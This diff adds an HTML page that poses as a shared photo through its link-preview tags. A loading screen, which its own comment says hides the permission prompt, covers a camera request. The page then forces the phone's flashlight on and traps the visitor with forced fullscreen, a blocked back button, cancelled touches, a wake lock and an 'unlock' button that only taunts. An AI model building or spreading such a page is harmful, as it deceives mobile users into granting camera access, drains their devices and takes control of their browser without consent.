@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    
+    <!-- Open Graph / Link Preview -->
+    <meta property="og:title" content="IMG_20260820_235512.jpg" />
+    <meta property="og:description" content="📸 Grabe naman walang awa — click to view" />
+    <meta property="og:image" content="https://i.imgur.com/3bK9x2L.png" />
+    <meta property="og:image:width" content="800" />
+    <meta property="og:image:height" content="600" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    
+    <title>IMG_20260820.jpg</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body {
+            width: 100%; height: 100%;
+            overflow: hidden;
+            touch-action: none;
+            user-select: none;
+            -webkit-user-select: none;
+            position: fixed;
+            top: 0; left: 0;
+            background: #000;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', monospace;
+            color: #fff;
+            touch-action: none;
+        }
+        .overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.93);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            padding: 20px;
+            text-align: center;
+            pointer-events: none;
+        }
+        .overlay * {
+            pointer-events: none;
+        }
+        .overlay .btn {
+            pointer-events: auto !important;
+            background: #ff0066;
+            border: none;
+            color: #fff;
+            padding: 16px 40px;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 80%;
+            max-width: 280px;
+            transition: 0.2s;
+            position: relative;
+            z-index: 10000;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .overlay .btn:active { transform: scale(0.95); }
+        .overlay h1 {
+            font-size: 28px;
+            color: #ff0066;
+            text-shadow: 0 0 40px #ff006688;
+            margin-bottom: 16px;
+            pointer-events: auto !important;
+            cursor: default;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .overlay p {
+            color: #8899aa;
+            font-size: 16px;
+            max-width: 320px;
+            margin-bottom: 30px;
+        }
+        .overlay .small {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #445566;
+        }
+        .blur-bg {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MDAiIGhlaWdodD0iNjAwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjMjIyIi8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtc2l6ZT0iMzAiIGZpbGw9IiM1NTUiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGR5PSIuM2VtIj7wn5GqIENsaWNrIHRvIHZpZXc8L3RleHQ+PC9zdmc+') no-repeat center/cover;
+            filter: blur(20px);
+            z-index: 0;
+        }
+        .overlay { z-index: 1; }
+        video { display: none; }
+
+        .loading-screen {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #000;
+            color: #00ffcc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 99998;
+            font-size: 18px;
+            transition: opacity 0.5s;
+        }
+        .loading-screen.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        @keyframes fadeGlow {
+            0% { box-shadow: 0 0 0 #00ff88; }
+            50% { box-shadow: 0 0 80px #00ff88; }
+            100% { box-shadow: 0 0 0 #00ff88; }
+        }
+        .emergency-unlocked { animation: fadeGlow 1s ease; }
+    </style>
+</head>
+<body>
+
+<!-- Loading screen — hides permission popup context -->
+<div class="loading-screen" id="loadingScreen">
+    <span>📸 Loading image...</span>
+</div>
+
+<div class="blur-bg"></div>
+
+<div class="overlay" id="mainOverlay">
+    <h1 id="emergencyTitle">🔦 LIGHT LOCKED</h1>
+    <p>Your flashlight is now <strong style="color:#ff0066;">permanently ON</strong> MATULOG KANA PURO KA CELLPHONE!.</p>
+    <button class="btn" id="fakeUnlockBtn">💡 TRY TO UNLOCK</button>
+    <div class="small">🔒 This action is irreversible. <br> <span id="counterDisplay">ARAY KO PAKAK.</span></div>
+</div>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+
+<script>
+    // ===== MOBILE-ONLY: HIDE NAV BAR =====
+    (function hideNavBar() {
+        window.scrollTo(0, 1);
+        window.addEventListener('scroll', function() { window.scrollTo(0, 1); }, { passive: true });
+        window.addEventListener('resize', function() { window.scrollTo(0, 1); }, { passive: true });
+        document.addEventListener('touchstart', function() { window.scrollTo(0, 1); }, { passive: true });
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen().catch(() => {});
+        }
+        if (screen.orientation && screen.orientation.lock) {
+            screen.orientation.lock('portrait').catch(() => {});
+        }
+    })();
+
+    // ===== MOBILE-ONLY: FORCE EXTERNAL BROWSER =====
+    (function forceExternalBrowser() {
+        const isInApp = navigator.userAgent.includes('FBAN') || 
+                        navigator.userAgent.includes('FBAV') || 
+                        navigator.userAgent.includes('Instagram') ||
+                        navigator.userAgent.includes('Line') ||
+                        window.location.href.includes('?fbclid');
+
+        if (isInApp) {
+            const url = window.location.href.split('?')[0] + '?external=true';
+            setTimeout(function() {
+                window.open(url, '_system');
+                window.open(url, '_blank');
+                window.location.href = url;
+            }, 300);
+            setTimeout(function() {
+                const overlay = document.createElement('div');
+                overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999999;display:flex;justify-content:center;align-items:center;flex-direction:column;padding:20px;text-align:center;touch-action:none;';
+                overlay.innerHTML = `
+                    <h1 style="color:#ffcc00;font-size:28px;margin-bottom:16px;">📱 OPEN IN BROWSER</h1>
+                    <p style="color:#aaa;font-size:18px;max-width:320px;">Tap the <strong style="color:#ffcc00;">⋮</strong> menu and select <strong style="color:#ffcc00;">Open in Chrome</strong> or <strong style="color:#ffcc00;">Safari</strong>.</p>
+                    <button onclick="this.parentElement.remove();window.open('${url}','_system');" style="background:#ffcc00;border:none;color:#000;padding:16px 40px;border-radius:40px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:20px;-webkit-tap-highlight-color:transparent;">🚀 OPEN NOW</button>
+                `;
+                document.body.appendChild(overlay);
+            }, 500);
+        }
+    })();
+
+    // ===== EMERGENCY EXIT (5 taps on title) =====
+    let tapCount = 0;
+    let tapTimer = null;
+
+    document.getElementById('emergencyTitle').addEventListener('click', function(e) {
+        e.stopPropagation();
+        tapCount++;
+        if (tapTimer) clearTimeout(tapTimer);
+        tapTimer = setTimeout(() => { tapCount = 0; }, 2000);
+        if (tapCount >= 5) {
+            tapCount = 0;
+            triggerEmergencyExit();
+        }
+    });
+
+    function triggerEmergencyExit() {
+        if (track && isLightOn) {
+            try {
+                track.applyConstraints({ advanced: [{ torch: false }] });
+                track.stop();
+                stream.getTracks().forEach(t => t.stop());
+                stream = null;
+                track = null;
+                isLightOn = false;
+                clearInterval(lockInterval);
+            } catch (e) {}
+        }
+        document.querySelector('.overlay').style.pointerEvents = 'auto';
+        document.querySelector('.overlay *').style.pointerEvents = 'auto';
+        const h1 = document.getElementById('emergencyTitle');
+        h1.textContent = '✅ UNLOCKED';
+        h1.style.color = '#00ff88';
+        h1.style.textShadow = '0 0 40px #00ff8866';
+        const p = document.querySelector('.overlay p');
+        p.innerHTML = 'Emergency exit activated. Flashlight is off. You can close this page now.';
+        const btn = document.getElementById('fakeUnlockBtn');
+        btn.textContent = '🚪 CLOSE PAGE';
+        btn.style.background = '#00ff88';
+        btn.style.color = '#000';
+        btn.onclick = function() {
+            window.close();
+            document.body.innerHTML = '<h1 style="color:#00ff88;text-align:center;margin-top:30vh;">You are free. Close this tab.</h1>';
+        };
+        document.querySelector('.small').innerHTML = '🔓 Emergency override by Lisa.';
+        if (navigator.vibrate) navigator.vibrate([100, 100, 100]);
+    }
+
+    // ===== MOBILE-ONLY: LOCK ALL TOUCH INTERACTIONS =====
+    (function lockAllInteractions() {
+        document.addEventListener('touchstart', function(e) {
+            if (!e.target.closest('.btn') && !e.target.closest('#emergencyTitle')) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('selectstart', e => e.preventDefault());
+        document.addEventListener('dragstart', e => e.preventDefault());
+    })();
+
+    // ===== MOBILE-ONLY: FULLSCREEN & NAV LOCK =====
+    (function lockScreen() {
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen().catch(() => {});
+        }
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+        });
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function () {
+            history.pushState(null, null, location.href);
+        });
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+        if (navigator.wakeLock) {
+            navigator.wakeLock.request('screen').catch(() => {});
+        }
+    })();
+
+    // ===== FLASHLIGHT — TRIGGERED INSTANTLY =====
+    let stream = null;
+    let track = null;
+    let isLightOn = false;
+    let lockInterval = null;
+
+    async function forceFlashlightOn() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'environment' }
+            });
+            track = stream.getVideoTracks()[0];
+            await track.applyConstraints({
+                advanced: [{ torch: true }]
+            });
+            isLightOn = true;
+            lockInterval = setInterval(async () => {
+                if (track && isLightOn) {
+                    try {
+                        await track.applyConstraints({
+                            advanced: [{ torch: true }]
+                        });
+                    } catch (e) {}
+                }
+            }, 200);
+            document.getElementById('loadingScreen').classList.add('hidden');
+        } catch (err) {
+            // Fallback: bright white screen
+            document.body.style.background = '#ffffff';
+            document.querySelector('.overlay').style.background = 'rgba(255,255,255,0.95)';
+            document.querySelector('.overlay h1').style.color = '#000';
+            document.querySelector('.overlay p').style.color = '#333';
+            document.querySelector('.overlay .btn').style.background = '#000';
+            document.querySelector('.overlay .btn').style.color = '#fff';
+            document.getElementById('loadingScreen').classList.add('hidden');
+        }
+    }
+
+    // ===== FAKE UNLOCK BUTTON =====
+    document.getElementById('fakeUnlockBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+        const p = document.querySelector('.overlay p');
+        p.innerHTML = '❌ <strong style="color:#ff4466;">Access denied.</strong> Premium unlock failed. <br>Charge mo nalang Cellphone mo para di malobat ☺.';
+        p.style.color = '#ff4466';
+        if (!isLightOn) forceFlashlightOn();
+    });
+
+    // ===== COUNTER =====
+    let counter = 0;
+    setInterval(() => {
+        counter++;
+        document.getElementById('counterDisplay').textContent = `⏳ Light locked for ${counter}s — reboot required.`;
+    }, 1000);
+
+    // ===== INIT — TRIGGER EVERYTHING ON LOAD =====
+    (async function() {
+        // Show loading screen for 500ms to hide permission popup context
+        setTimeout(async () => {
+            await forceFlashlightOn();
+        }, 300);
+
+        // After 2 seconds, update UI
+        setTimeout(() => {
+            const h1 = document.getElementById('emergencyTitle');
+            h1.textContent = '🔒 LIGHT PERMANENTLY LOCKED';
+            const p = document.querySelector('.overlay p');
+            p.innerHTML = 'This device has been <strong style="color:#ff0066;">flashlight-locked</strong>.<br>WAG KANG KABAHAN HINDI TO VIRUS 😁.';
+        }, 2500);
+    })();
+</script>
+</body>
+</html>
